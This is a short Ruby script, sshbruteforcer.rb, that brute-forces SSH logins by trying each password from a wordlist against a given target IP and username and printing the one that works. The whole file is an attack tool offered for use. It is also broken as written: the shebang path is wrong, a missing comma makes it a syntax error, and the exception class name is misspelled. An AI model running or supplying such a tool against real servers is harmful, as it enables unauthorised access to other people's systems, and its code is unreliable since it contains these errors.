#!/user/bin/ruby
# sshbruteforcer.rb

require 'net/ssh'
require 'net/ping' 

if ARGV.length != 3

  puts "Usage: <target IP> <username> <wordlist>"
  exit
end

# Function Definition
def CrackPasswords()

    target = ARGV[0]
    user = ARGV[1]
    wordlist_file = ARGV[2]

    File.foreach(wordlist_file).with_index(1) do |line, idx|

    pass = line.chomp
    puts
    print "Trying password number #{idx} : #{pass}"

    begin
      result1 = Net::SSH.start(
                                target, 
                                user,
                                :password => pass
                                :auth_methods => ["password"],
                                :number_of_password_prompts => 0
                              )
    rescue Net::SSH::AuthernticationFailed => auth

    else

      abort "\n\nThe password is #{pass}.\n\n"

    end
  end
  puts "\nThe password wasn't found in the list!"

end

#Call Function
CrackPasswords()
